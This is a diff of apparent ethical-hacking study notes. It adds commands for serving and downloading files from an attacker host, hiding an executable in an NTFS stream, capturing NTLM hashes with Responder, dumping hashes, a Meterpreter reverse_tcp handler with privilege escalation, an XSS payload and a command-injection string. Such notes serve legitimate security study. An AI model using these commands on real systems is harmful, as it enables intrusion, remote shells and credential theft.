@@ -4,22 +4,39 @@
 - nmap : https://www.stationx.net/nmap-cheat-sheet/ 
 - Hping DDOS: https://linuxhint.com/hping3/ 
 - Hydra : https://github.com/frizb/Hydra-Cheatsheet 
+- sqlmap : https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d 
+- msfvenom : https://securityonline.info/msfvenom-payload-list/ 
 - WindowsCommand : 
 https://www.thomas-krenn.com/en/wiki/Cmd_commands_under_Windows 
 https://www.lifewire.com/net-user-command-2618097 
 
-## fileShare
+## fileShare/download 
 
-- access windows smb on linux : smb://ip
-- python : python -m SimpleHTTP 
+### Share 
+
+- python : python -m SimpleHTTPServer 80
+- python: python -m pyftpdlib 21 #attackerip
 - apache server :  
 service apache2 start  
 cd /var/www/html
 
+### Download/Access 
+
+- certutil.exe --urlcache -f  #http://fileurl
+- wget #http://fileurl
+- access windows smb on linux : smb://windowsip
+
+
+
+
 ## Module 01 : Cryptography 
+
 Hash : MD5 
 Encrepted Disk : VeraCrypt 
-Stegnography : openStego  or  QuickStego  for picture
+
+Stegnography : 
+image : use openStego  or  QuickStego 
+NTFS streams :type ./calc.exe  > ./readme.txt:calc.exe 
 
 ## Module 03 : Enumeration / Scanning
 
@@ -52,6 +69,9 @@ set RHOSTS 10.10.10.8-16
 set THREADS 100
 run
 hosts -> now exact os_flavor information has been updated
+
+#### snmp enum using MSF 
+use auxiliary/scanner/snmp/snmp_login
 
 ### Scanning Networks
 - Port Scanning using Hping3:
@@ -112,11 +132,7 @@ use ADExplorer
 - Nessus 
 
 ## Module 06 : System Hacking
-### NTLM Hash crack :
 
-- responder -I eth0 # trigger wrong smb path
-- usr\share\responder\logs --> Responder log location
-- john /usr/share/responder/logs/ntlm.txt
 
 ### Rainbowtable crack using Winrtgen/RainbowCrack :
 WINRTGEN : Create rainbow
@@ -130,12 +146,36 @@ RainbowCrack : Use rainbow
 
 ### Hash dump with Pwdump7 and crack with ohpcrack :
 
-- wmic useraccount get name,sid --> Get user acc names and SID
-- PwDump7.exe > c:\hashes.txt
+- wmic useraccount get name,sid -**-> Get user acc names and SID**
+- **PwDump7.exe** > c:\hashes.txt
 - Replace boxes in hashes.txt with relevant usernames from step 1.
 - Ophcrack.exe -> load -> PWDUMP File
 - Tables -> Vista free -> select the table directory -> crack
 
+### NTLM Hash crack :
+
+- responder -I eth0 # trigger wrong smb path
+- usr\share\responder\logs --> Responder log location
+- john /usr/share/responder/logs/ntlm.txt
+
+## MSF System Hack
+
+##  Create payload get shell  
+- create payload with msfvenom
+
+- use multi/handler 
+set payload windows/meterpreter/reverse_tcp # same to msfvenom 
+options '# set options
+run 
+
+-  Execute payload on targetsystem
+
+## privilege escalation 
+
+1. getsystem # work maybe 
+2. run post/multi/recon/local_exploit_suggester # session background and try local exploit
+
+# run vnc 
 
 ## Module 08 : Sniffing
 
@@ -162,6 +202,8 @@ WP password bruteforce
 msfconsole
 use auxiliary/scanner/http/wordpress_login_enum
 
+XSS 
+`<script> alert("toor") </script>'
 RCE 
 ping 127.0.0.1 | hostname | net user
 
